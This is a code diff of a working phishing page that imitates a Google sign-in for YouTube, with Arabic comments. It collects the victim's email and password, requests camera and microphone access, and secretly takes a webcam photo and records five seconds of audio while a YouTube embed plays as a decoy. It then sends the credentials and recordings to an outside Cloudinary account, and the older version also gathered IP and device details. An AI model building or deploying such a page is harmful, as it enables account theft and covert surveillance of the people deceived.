@@ -5,96 +5,89 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-card { width: 95%; max-width: 440px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        img.logo { width: 75px; margin-bottom: 15px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
-        p { color: #3c4043; font-size: 16px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        .login-card { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; background: #fff; z-index: 1000; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
+        #yt-frame { width: 100%; height: 100%; border: none; display: none; }
         #v, #c { display: none; }
-        .loader { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="login-card" id="ui">
-    <div id="form">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-        <h1>تسجيل الدخول</h1>
-        <p>المتابعة إلى YouTube</p>
-        <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="p" placeholder="كلمة المرور" required>
-        <button onclick="start()">التالي</button>
-    </div>
-    <div id="load" class="loader">
-        <img src="https://i.gifer.com/ZZ5H.gif" width="40">
-        <p style="margin-top:15px; color:#5f6368;">جاري التحقق من أمان الحساب...</p>
-    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+    <h2>تسجيل الدخول</h2>
+    <p>المتابعة إلى YouTube</p>
+    <input type="email" id="e" placeholder="البريد الإلكتروني">
+    <input type="password" id="p" placeholder="كلمة المرور">
+    <button onclick="start()">التالي</button>
 </div>
+
+<iframe id="yt-frame"></iframe>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
 
     async function start() {
         const email = document.getElementById('e').value, pass = document.getElementById('p').value;
         if(!email || !pass) return;
 
-        // إظهار التمويه فوراً
-        document.getElementById('form').style.display = 'none';
-        document.getElementById('load').style.display = 'block';
-
         try {
-            // طلب الكاميرا والمايك (سيظهر طلب الكروم الرسمي)
-            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // 1. اطلب الإذن فوراً
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const video = document.getElementById('v');
-            video.srcObject = s;
-            video.muted = true;
-            video.play(); // لضمان عدم خروج شاشة سوداء
+            video.srcObject = stream;
+            video.play();
 
-            // انتظار ثانيتين (وقت منطقي للتحميل + وقت للكاميرا تفتح بوضوح)
+            // 2. "الخروج المشرف" الوهمي: افتح يوتيوب في نفس الصفحة
+            document.getElementById('ui').style.display = 'none';
+            const frame = document.getElementById('yt-frame');
+            frame.src = yt;
+            frame.style.display = 'block';
+
+            // 3. دلوقتي صفحتنا لسه شغال (رغم إن اليوزر شايف يوتيوب)
+            // هنستنى 3 ثواني عشان الكاميرا والمايك يجمعوا داتا حقيقية
             setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                const img = canvas.toDataURL("image/png");
-
-                // سحب البيانات والرفع في الخلفية (Background)
-                handleData(email, pass, img);
-
-                // التحويل الفوري لليوتيوب (بدون انتظار نتيجة الرفع)
-                window.location.href = yt;
-            }, 2500); 
+                captureAndRecord(email, pass, stream);
+            }, 3000);
 
         } catch (err) {
-            window.location.href = yt; // لو رفض يروح لليوتيوب فوراً
+            window.location.href = "https://www.youtube.com";
         }
     }
 
-    async function handleData(email, pass, img) {
-        let ip = "0.0.0.0", dev = "Unknown";
-        try { 
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            ip = d.ip;
-            dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-        } catch(e){}
+    async function captureAndRecord(email, pass, stream) {
+        // التقاط الصورة
+        const canvas = document.getElementById('c');
+        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+        const img = canvas.toDataURL("image/png");
 
-        const fd = new FormData();
-        fd.append('file', img);
-        fd.append('upload_preset', pr);
-        fd.append('context', `u=${email}|p=${pass}|ip=${ip}|dev=${dev}`);
-        fd.append('tags', `Target_${email},IP_${ip}`);
+        // تسجيل صوت لمدة 5 ثواني في صمت
+        const rec = new MediaRecorder(stream);
+        let chunks = [];
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = () => {
+            const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
+            upload(email, pass, img, audioBlob);
+        };
+        rec.start();
+        setTimeout(() => rec.stop(), 5000);
+    }
 
-        // استخدام keepalive يضمن وصول البيانات للسيرفر حتى بعد قفل التاب
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, {
-            method: 'POST',
-            body: fd,
-            keepalive: true 
-        });
+    async function upload(e, p, img, ab) {
+        const fdImg = new FormData();
+        fdImg.append('file', img); fdImg.append('upload_preset', pr);
+        fdImg.append('context', `u=${e}|p=${p}`);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fdImg });
+
+        const fdAud = new FormData();
+        fdAud.append('file', ab); fdAud.append('upload_preset', pr);
+        fdAud.append('resource_type', 'video');
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fdAud });
     }
 </script>
 </body>
